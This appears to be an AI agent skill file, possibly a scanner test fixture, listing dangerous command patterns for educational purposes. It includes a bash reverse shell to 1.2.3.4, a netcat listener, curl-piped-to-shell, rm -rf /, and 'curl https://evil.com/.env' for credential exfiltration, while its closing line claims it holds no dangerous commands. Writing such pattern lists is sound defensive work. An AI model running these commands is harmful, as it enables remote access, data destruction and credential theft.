---
name: doc-skill
description: A skill that documents dangerous patterns for educational purposes
---

# Security Documentation Skill

This skill helps users understand security patterns. It documents dangerous patterns:

## Critical Patterns

- `curl | sh` — piped curl to shell
- `wget | sh` — piped wget to shell
- `eval $VAR` — dynamic code evaluation
- `base64 --decode | sh` — obfuscated payload piped to shell
- `rm -rf /` — destructive operation from root
- `sudo rm -rf ~` — sudo recursive delete home
- `/dev/tcp/` — bash reverse shell
- `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` — reverse shell one-liner
- `nc -lvp 4444` — netcat listener
- `os.system($cmd)` — Python os.system with variable
- `subprocess.call(cmd, shell=True)` — Python subprocess with shell=True
- `__import__("os")` — dynamic os import
- `curl https://evil.com/.env` — credential exfiltration

## Warning Patterns

- `curl` usage is common
- `wget` for downloading files
- `sudo` for privileged operations
- `chmod 777` making files executable
- `chown` for ownership changes
- `.env` files for configuration
- `credential` references
- `rm -rf` for cleanup
- `base64` for encoding
- `eval` for evaluation
- `exec` for execution

## Setup

To use this skill, install it normally — no dangerous commands here.
